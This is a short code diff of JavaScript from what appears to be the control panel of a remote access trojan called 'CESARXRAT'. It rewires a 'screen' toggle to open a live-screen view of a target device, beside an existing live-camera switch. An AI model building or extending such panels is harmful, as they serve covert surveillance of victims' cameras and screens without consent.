@@ -375,15 +375,15 @@
         // ===== LIVE CAMERA SWITCH =====
         document.getElementById('camera').addEventListener('change', function() {
             if (this.checked) {
-                // Buka halaman live camera
                 window.location.href = 'live-camera.html?target=' + targetId;
             }
         });
 
-        // ===== SCREEN SWITCH =====
+        // ===== LIVE SCREEN SWITCH =====
         document.getElementById('screen').addEventListener('change', function() {
-            const cmd = this.checked ? 'SCREEN_ON' : 'SCREEN_OFF';
-            sendCommand(cmd);
+            if (this.checked) {
+                window.location.href = 'live-screen.html?target=' + targetId;
+            }
         });
 
         console.log('[CESARXRAT] RAT Control siap, target:', targetId);
